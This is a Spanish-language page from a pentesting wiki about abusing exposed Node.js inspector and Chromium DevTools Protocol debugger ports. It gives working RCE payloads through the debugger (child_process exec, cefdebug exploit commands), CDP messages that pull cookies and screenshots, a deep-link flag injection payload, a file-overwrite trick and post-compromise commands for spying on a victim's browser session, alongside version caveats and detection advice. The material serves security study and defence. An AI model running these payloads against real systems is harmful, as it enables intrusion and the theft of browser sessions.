# Abuso del depurador de Node inspector/CEF

{{#include ../../banners/hacktricks-training.md}}

Entre los ejemplos prácticos históricos se incluyen el recorrido de Multimaster y el ataque al depurador de Visual Studio Code CVE-2019-1414; úsalos como contexto específico de esas versiones, en lugar de asumir que todos los objetivos actuales de Electron o Chromium exponen las mismas primitivas.<sup>[[1]](#references)[[3]](#references)</sup>

## Información básica

[Según la documentación](https://nodejs.org/learn/getting-started/debugging): Al iniciarse con la opción `--inspect`, un proceso de Node.js escucha a la espera de un cliente de depuración. De forma **predeterminada**, escucha en el host y puerto **`127.0.0.1:9229`**. También se asigna un **UUID** **único** a cada proceso.<sup>[[4]](#references)</sup>

Los clientes del inspector deben conocer e indicar la dirección del host, el puerto y el UUID para conectarse. Una URL completa tendrá un aspecto similar a `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.<sup>[[4]](#references)</sup>

> [!WARNING]
> Como el **depurador tiene acceso completo al entorno de ejecución de Node.js**, un actor malicioso que pueda conectarse a este puerto podría ejecutar código arbitrario en nombre del proceso de Node.js (**posible escalada de privilegios**).<sup>[[4]](#references)</sup>

Hay varias formas de iniciar un inspector:<sup>[[4]](#references)</sup>

```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```

Cuando inicies un proceso inspeccionado, aparecerá algo como esto:<sup>[[4]](#references)</sup>

```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```

Los procesos basados en **CEF** (**Chromium Embedded Framework**) pueden exponer un depurador con `--remote-debugging-port=9222`. Esto expone el navegador mediante [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), en lugar de un inspector de Node.js, por lo que las cargas útiles basadas en `process` de Node.js no son aplicables directamente de forma predeterminada.<sup>[[2]](#references)[[5]](#references)</sup>

Al iniciar un navegador con la depuración habilitada, aparecerá algo como esto:<sup>[[2]](#references)[[5]](#references)</sup>

```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```

### Enumeración y control de un endpoint CDP

Los endpoints de descubrimiento HTTP distinguen el WebSocket del **navegador** de los WebSockets de cada **target** (pestaña, worker, extensión, etc.). Consulta `/json/version` para obtener el endpoint del navegador y `/json/list` para ver los targets; después, puedes controlar directamente los valores `webSocketDebuggerUrl` devueltos mediante mensajes similares a JSON-RPC de CDP.<sup>[[5]](#references)</sup>

```bash
# Browser metadata and browser-level WebSocket
curl -s http://127.0.0.1:9222/json/version | jq

# Pages/workers and their target-level WebSockets
curl -s http://127.0.0.1:9222/json/list |
  jq '.[] | {id, type, title, url, webSocketDebuggerUrl}'

BROWSER_WS=$(curl -s http://127.0.0.1:9222/json/version | jq -r .webSocketDebuggerUrl)
PAGE_WS=$(curl -s http://127.0.0.1:9222/json/list | jq -r '[.[] | select(.type=="page")][0].webSocketDebuggerUrl')
```

Por ejemplo, conéctate con `websocat "$BROWSER_WS"` y envía `{"id":1,"method":"Target.getTargets"}` o `{"id":2,"method":"Storage.getCookies"}`. En un objetivo de página (`websocat "$PAGE_WS"`), `Runtime.evaluate` se ejecuta en ese renderer y `Page.captureScreenshot` devuelve una captura de pantalla codificada en base64. `document.cookie` no puede revelar las cookies `HttpOnly`, mientras que `Storage.getCookies` consulta el almacén de cookies del navegador.<sup>[[5]](#references)</sup>

```json
{"id":3,"method":"Runtime.evaluate","params":{"expression":"({url:location.href,title:document.title,cookie:document.cookie})","returnByValue":true}}
{"id":4,"method":"Page.captureScreenshot","params":{"format":"png"}}
```

### Navegadores, WebSockets y política del mismo origen <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Los sitios web abiertos en un navegador pueden realizar solicitudes WebSocket y HTTP según el modelo de seguridad del navegador. Se necesita una **conexión HTTP inicial** para **obtener un ID de sesión de debugger único**. La **política del mismo origen** **impide** que los sitios web puedan realizar **esta conexión HTTP**. Para brindar protección adicional contra [**ataques de DNS rebinding**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** Node.js verifica que los **headers 'Host'** de la conexión especifiquen una **dirección IP** o exactamente **`localhost`**.<sup>[[4]](#references)</sup>

> [!TIP]
> **Estas medidas de seguridad impiden explotar el inspector** para ejecutar código **simplemente enviando una solicitud HTTP** (lo que podría hacerse explotando una vulnerabilidad SSRF).<sup>[[4]](#references)</sup>

### Iniciar el inspector en procesos en ejecución

Puedes enviar la **señal SIGUSR1** a un proceso nodejs en ejecución para que **inicie el inspector** en el puerto predeterminado. Sin embargo, ten en cuenta que necesitas tener suficientes privilegios, así que esto podría otorgarte **acceso privilegiado a información dentro del proceso**, pero no una escalada de privilegios directa.<sup>[[4]](#references)</sup>

```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```

> [!TIP]
> Esto es útil en contenedores porque **apagar el proceso e iniciar uno nuevo** con `--inspect` **no es una opción**, ya que el **contenedor** se **cerrará** junto con el proceso.<sup>[[6]](#references)</sup>

### Conectarse al inspector/debugger

Para conectarse a un **navegador basado en Chromium**, se puede acceder a las URL `chrome://inspect` o `edge://inspect` para Chrome o Edge, respectivamente. Al hacer clic en el botón Configure, hay que asegurarse de que el **host y el puerto de destino** aparezcan correctamente. La imagen muestra un ejemplo de Remote Code Execution (RCE):<sup>[[2]](#references)[[4]](#references)</sup>

![Después aparecerá una URL para acceder al debugger, por ejemplo, ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Conectarse al inspector/debugger: Para conectarse a un navegador basado en Chromium,...](<../../images/image (674).png>)

Con la **línea de comandos**, puedes conectarte a un debugger/inspector con:<sup>[[2]](#references)[[4]](#references)</sup>

```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```

La herramienta [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) permite **encontrar inspectores** que se ejecutan localmente e **inyectar código** en ellos.<sup>[[2]](#references)</sup>

```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```

> [!TIP]
> Ten en cuenta que los exploits de **RCE en NodeJS no funcionarán** si te conectas a un navegador mediante [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (debes consultar la API para encontrar cosas interesantes que hacer con él).<sup>[[2]](#references)[[5]](#references)</sup>

## RCE en el debugger/inspector de NodeJS

> [!TIP]
> Si llegaste aquí buscando cómo obtener [**RCE a partir de un XSS en Electron, consulta esta página.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Algunas formas comunes de obtener **RCE** cuando puedes **conectarte** a un **inspector** de Node consisten en usar algo como esto (parece que esto **no funcionará al conectarse mediante Chrome DevTools Protocol**):<sup>[[2]](#references)</sup>

```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```

## Payloads del Chrome DevTools Protocol

Puedes consultar la API aquí: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
En esta sección solo enumeraré cosas interesantes que he encontrado que la gente ha usado para explotar este protocolo.

### Restricción del perfil predeterminado en Chrome 136+

A partir de **Chrome 136**, Chrome ignora `--remote-debugging-port` y `--remote-debugging-pipe` cuando se dirigen al **directorio de datos predeterminado de Chrome**. El switch debe combinarse con un `--user-data-dir` no estándar, cuya clave de cifrado independiente y cuyo estado aislado del navegador impiden que la técnica simple basada en flags exponga el perfil autenticado normal del usuario. No debe suponerse que esta restricción específica de Chrome también se aplique a versiones anteriores de Chrome, Chrome for Testing, aplicaciones Electron/CEF u otros derivados de Chromium sin verificarlo.<sup>[[14]](#references)</sup>

```bash
# Valid current-Chrome debugging setup, but this is a new isolated profile
google-chrome --remote-debugging-port=9222 --user-data-dir=/tmp/chrome-cdp-lab
```

Por lo tanto, ver un proceso de Chrome actual iniciado únicamente con `--remote-debugging-port` **no** demuestra que CDP se haya activado. Confirma el listener y `/json/version`, y determina qué perfil lo respalda.<sup>[[14]](#references)</sup>

### Inyección de parámetros mediante deep links

En [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/), Rhino Security descubrió que una aplicación basada en CEF **registró un URI personalizado** en el sistema (workspaces://index.html), que recibía el URI completo y luego **iniciaba la aplicación basada en CEF** con una configuración construida parcialmente a partir de ese URI.<sup>[[8]](#references)</sup>

Se descubrió que los parámetros del URI se decodificaban como URL y se usaban para iniciar la aplicación básica de CEF, lo que permitía a un usuario **inyectar** la flag **`--gpu-launcher`** en la **línea de comandos** y ejecutar acciones arbitrarias.<sup>[[8]](#references)</sup>

Por lo tanto, un payload como:

```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```

Ejecutará calc.exe.<sup>[[8]](#references)</sup>

### Sobrescribir archivos

Cambia la carpeta donde se guardan los **archivos descargados** y descarga un archivo para **sobrescribir** el **código fuente** de uso frecuente de la aplicación con tu **código malicioso**.<sup>[[5]](#references)[[6]](#references)</sup>

```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
  JSON.stringify({
    id: 42069,
    method: "Browser.setDownloadBehavior",
    params: {
      behavior: "allow",
      downloadPath: "/code/",
    },
  })
)
```

### RCE y exfiltración mediante WebDriver

STAR Labs mostró que los servicios WebDriver/CDP expuestos pueden permitir la lectura arbitraria de archivos y RCE; en algunas configuraciones, DNS rebinding puede completar la cadena de explotación.<sup>[[9]](#references)</sup>

El servicio WebDriver de ChromeDriver es distinto de Chrome DevTools/CDP. Su capacidad [`goog:chromeOptions.binary`](https://developer.chrome.com/docs/chromedriver/capabilities) selecciona el ejecutable del navegador que se inicia para una nueva sesión. Si un usuario sin privilegios puede acceder a un servicio ChromeDriver que se ejecuta como root y enviar una sesión con una ruta de ejecutable controlada por el usuario, ese inicio puede cruzar el límite de privilegios del servicio. Una respuesta vacía de `/sessions` no permite determinar si se pueden crear sesiones nuevas. Antes de concluir que esta vía es viable, inspecciona el propietario del proceso, la accesibilidad real del listener, la autorización de sesiones, el acceso al ejecutable y las medidas de aislamiento; el nombre del proceso o el puerto habitual no bastan por sí solos. [Las recomendaciones de seguridad de Google](https://developer.chrome.com/docs/chromedriver/security-considerations) indican que ChromeDriver debe ejecutarse con una cuenta sin privilegios. La enumeración pasiva no debe crear una sesión WebDriver.

Para más casos históricos de automatización de navegadores y seguridad de Chromium, consulta el informe de Counter WebDriver y los issues 773, 1742 y 1944 de Project Zero.<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### Habilitar CDP dentro de un proceso Chromium activo

En Windows, [**CDP-Enabler**](https://github.com/deathflamingo/CDP-Enabler) demostró que la restricción de la línea de comandos no es la única forma de activar CDP: el código que ya puede inyectarse en un `msedge.exe` existente puede invocar el símbolo no exportado de Chromium `content::DevToolsAgentHost::StartRemoteDebuggingServer` y exponer el perfil activo autenticado sin reiniciar el navegador.<sup>[[15]](#references)</sup>

La cadena demostrada inyecta una DLL con `VirtualAllocEx`/`WriteProcessMemory`/`CreateRemoteThread`, resuelve símbolos internos de Edge (primero desde PDB y luego con firmas de bytes específicas de cada versión), crea una subclase de la ventana del navegador y publica un mensaje para que la llamada final que inicia el servidor se ejecute en el **hilo de la interfaz de usuario** del navegador. El socket se enlaza a loopback; después, las primitivas CDP habituales pueden recuperar cookies, capturar pestañas, inspeccionar el tráfico de red o evaluar JavaScript en páginas autenticadas.<sup>[[15]](#references)</sup>

> [!WARNING]
> Esta es una técnica de **post-compromiso/inyección de procesos**, no un bypass de red sin autenticación. Depende en gran medida de la build, porque los símbolos C++ relevantes no se exportan y las firmas pueden cambiar tras las actualizaciones del navegador.<sup>[[15]](#references)</sup>

Para la detección, no dependas únicamente de la telemetría de la línea de comandos `--remote-debugging-*`: correlaciona también los handles inusuales y las operaciones de memoria dirigidas a procesos del navegador (`PROCESS_VM_OPERATION`, `PROCESS_VM_WRITE`, creación de hilos), la inyección de DLL y los sockets de escucha loopback inesperados cuyo propietario sea Chrome/Edge.<sup>[[15]](#references)</sup>

### Post-Exploitation

En un entorno real y **tras comprometer** un PC de usuario que utilice un navegador basado en Chromium, una técnica histórica consistía en reiniciar el navegador con la depuración habilitada y reenviar el puerto loopback. Esto puede exponer el estado de navegación de la víctima en productos/builds que todavía aceptan el perfil seleccionado, pero Chrome 136+ no lo permitirá con el directorio de datos predeterminado.<sup>[[7]](#references)[[14]](#references)</sup>

El comando de reinicio original se conserva abajo para objetivos antiguos o específicos de una versión. El segundo comando es el método compatible con las versiones actuales de Chrome, pero crea un perfil aislado en lugar de volver a abrir el estado autenticado habitual de la víctima.<sup>[[7]](#references)[[14]](#references)</sup>

```powershell
# Historical: verify whether the target actually honors it
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"

# Current Chrome: CDP works, but against a new profile
Start-Process "Chrome" "--remote-debugging-port=9222 --user-data-dir=$env:TEMP\chrome-cdp"
```

Para las técnicas específicas de macOS relacionadas con el reinicio de Chromium, las extensiones y CDP, consulta [Inyección de Chromium en macOS](../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md).



## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - Herramienta de inspección y explotación del depurador de CEF/Chromium](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Ejecución remota de código en Visual Studio Code mediante el depurador de Chrome DevTools](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Guía de depuración de Node.js - Primeros pasos](https://nodejs.org/learn/getting-started/debugging)
- [5] [Protocolo de Chrome DevTools](https://chromedevtools.github.io/devtools-protocol/)
- [6] [Informe de corCTF 2021 - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-explotación: abuso de la función de depuración de Chrome para observar y controlar sesiones de navegación de forma remota](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: Ejecución remota de código en AWS WorkSpaces](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [¿Me hablas a mí? - RCE en WebDriver mediante DNS rebinding y CDP (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Contra WebDriver - De bot a RCE](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Incidencia 773 de Google Project Zero (rastreador de errores de Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Incidencia 1742 de Google Project Zero (rastreador de errores de Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Incidencia 1944 de Google Project Zero (rastreador de errores de Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [14] [Cambios en los parámetros de depuración remota para mejorar la seguridad - Chrome para desarrolladores](https://developer.chrome.com/blog/remote-debugging-port)
- [15] [Inyección de CDP en un navegador Edge en ejecución: análisis detallado de la instrumentación del navegador en tiempo de ejecución](https://deathflamingo.com/blog/cdp_enabler/)
{{#include ../../banners/hacktricks-training.md}}
